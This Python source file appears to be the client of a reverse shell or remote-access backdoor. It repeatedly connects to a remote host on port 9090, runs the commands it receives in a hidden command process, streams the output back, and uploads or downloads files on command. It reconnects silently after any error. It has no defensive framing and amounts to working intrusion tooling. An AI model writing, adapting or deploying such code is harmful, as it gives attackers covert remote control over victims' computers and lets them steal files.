from subprocess import PIPE, Popen, CREATE_NO_WINDOW
import time
import sys
from bestSocket import *
from bCCmd import *

URL = ''
PORT = 9090

while 1:
    try:
        bs = BestSocket(URL, PORT, "client")
        bc = BCCmd()

        while True:
            time.sleep(0.01)
            bc.stdall('err', b'|E', bs.send)
            bc.stdall('out', b'|O', bs.send)

            time.sleep(0.01)
            bs.send(b'_ ')
            rawdata = bs.recv()

            if rawdata[0] == 47:
                asp = argsSplit(rawdata[1:])
          
                match asp[0].lower():
                    case b'lfile':
                        bs.recvFile(asp[1])
                    case b'sfile':
                        bs.sendFile(asp[1])
                    case b'n':
                        bc.send(b'')
                      
            else:
                bc.send(rawdata)
                time.sleep(1)
            bc.flush()
    except:
        continue